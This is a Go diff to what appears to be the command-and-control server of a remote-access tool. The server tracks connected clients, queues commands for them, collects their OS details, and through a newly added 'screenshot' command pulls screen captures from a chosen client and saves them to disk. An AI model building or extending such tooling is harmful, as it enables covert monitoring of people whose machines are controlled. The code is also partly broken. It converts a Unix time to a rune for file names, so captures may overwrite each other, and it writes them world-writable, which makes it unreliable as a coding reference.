@@ -6,9 +6,11 @@ import (
 	"flag"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
 	"net"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 
@@ -27,6 +29,10 @@ type OSInfo struct {
 	Codename     string
 	Version      string
 	Build        string
+}
+type Shots struct {
+	ShotTime time.Time
+	Data     []byte
 }
 type Client struct {
 	ID       string
@@ -119,6 +125,22 @@ func (s server) HandleCommands(srv pb.Com_HandleCommandsServer) error {
 				log.Println("-------------------")
 
 			}
+		case "screenshot":
+			{
+				var shots []Shots
+
+				err := json.Unmarshal(req.Data, &shots)
+
+				if err != nil {
+					log.Fatalf("%v", err)
+				}
+
+				for shot := range shots {
+
+					ioutil.WriteFile(string(time.Now().Unix())+".png", shots[shot].Data, 0777)
+				}
+
+			}
 		default:
 			{
 				resp := pb.Response{ClientID: req.ClientID, ClientIPAddress: req.ClientIPAddress, Command: "not-found", Data: nil}
@@ -167,11 +189,14 @@ func (cli *CommandLine) validateArgs(data []string) {
 }
 
 func (cli *CommandLine) getClients() {
-	for k := range Clients {
 
+	localIds := GenerateClientsIds(Clients)
+
+	for id := range localIds {
 		now := time.Now()
-		lastContact := now.Sub(Clients[k].LastPing)
-		log.Printf("Client ID: %s - IP: %s - Last Contact: %s ago", k, Clients[k].ClientIP, lastContact)
+		lastContact := now.Sub(Clients[localIds[id]].LastPing)
+		log.Printf("[%v] Client ID: %s - IP: %s - Last Contact: %s ago", id, localIds[id], Clients[localIds[id]].ClientIP, lastContact)
+
 	}
 }
 
@@ -186,9 +211,9 @@ func (cli *CommandLine) Run() {
 
 		clients := flag.NewFlagSet("clients", flag.ExitOnError)
 		osinfo := flag.NewFlagSet("osinfo", flag.ExitOnError)
-
+		screenshot := flag.NewFlagSet("screenshot", flag.ExitOnError)
 		clientosinfo := osinfo.String("clientid", "", "Gets OSINFO of specified client")
-
+		clientscreenshot := screenshot.String("clientid", "", "Gets Screenshots of specified client")
 		switch data[0] {
 		case "clients":
 			err := clients.Parse(data[1:])
@@ -197,6 +222,11 @@ func (cli *CommandLine) Run() {
 			}
 		case "osinfo":
 			err := osinfo.Parse(data[1:])
+			if err != nil {
+				log.Panic(err)
+			}
+		case "screenshot":
+			err := screenshot.Parse(data[1:])
 			if err != nil {
 				log.Panic(err)
 			}
@@ -213,16 +243,83 @@ func (cli *CommandLine) Run() {
 			if *clientosinfo == "" {
 				osinfo.Usage()
 			} else {
-				if Command[*clientosinfo] == "osinfo" {
-					log.Println("WARING: osinfo request already sent to client... Please wait a response!")
+
+				if id, err := strconv.Atoi(*clientosinfo); err == nil {
+					localIds := GenerateClientsIds(Clients)
+					if Clients[localIds[id]].ID != "" {
+						if Command[Clients[localIds[id]].ID] == "osinfo" {
+							log.Println("WARING: osinfo request already sent to client... Please wait a response!")
+						} else {
+							log.Println("INFO: osinfo request sent to client... Please wait a response!")
+							Command[Clients[localIds[id]].ID] = "osinfo"
+						}
+					} else {
+						log.Println("ERROR: Invalid Client ID!")
+					}
+
 				} else {
-					log.Println("INFO: osinfo request sent to client... Please wait a response!")
-					Command[*clientosinfo] = "osinfo"
+
+					if Clients[*clientosinfo].ID != "" {
+						if Command[*clientosinfo] == "osinfo" {
+							log.Println("WARING: osinfo request already sent to client... Please wait a response!")
+						} else {
+							log.Println("INFO: osinfo request sent to client... Please wait a response!")
+							Command[*clientosinfo] = "osinfo"
+						}
+					} else {
+						log.Println("ERROR: Invalid Client ID!")
+					}
+
 				}
 
+			}
+			if screenshot.Parsed() {
+				if *clientscreenshot == "" {
+					screenshot.Usage()
+				} else {
+
+					if id, err := strconv.Atoi(*clientscreenshot); err == nil {
+						localIds := GenerateClientsIds(Clients)
+						if Clients[localIds[id]].ID != "" {
+							if Command[Clients[localIds[id]].ID] == "screenshot" {
+								log.Println("WARING: screenshot request already sent to client... Please wait a response!")
+							} else {
+								log.Println("INFO: screenshot request sent to client... Please wait a response!")
+								Command[Clients[localIds[id]].ID] = "screenshot"
+							}
+						} else {
+							log.Println("ERROR: Invalid Client ID!")
+						}
+
+					} else {
+
+						if Clients[*clientscreenshot].ID != "" {
+							if Command[*clientscreenshot] == "screenshot" {
+								log.Println("WARING: screenshot request already sent to client... Please wait a response!")
+							} else {
+								log.Println("INFO: screenshot request sent to client... Please wait a response!")
+								Command[*clientscreenshot] = "screenshot"
+							}
+						} else {
+							log.Println("ERROR: Invalid Client ID!")
+						}
+
+					}
+				}
 			}
 
 		}
 	}
 
+}
+
+//GenerateClientsIds returns clients mapped as int
+func GenerateClientsIds(clients map[string]Client) map[int]string {
+	localID := 0
+	localIDMap := map[int]string{}
+	for k := range clients {
+		localID++
+		localIDMap[localID] = k
+	}
+	return localIDMap
 }
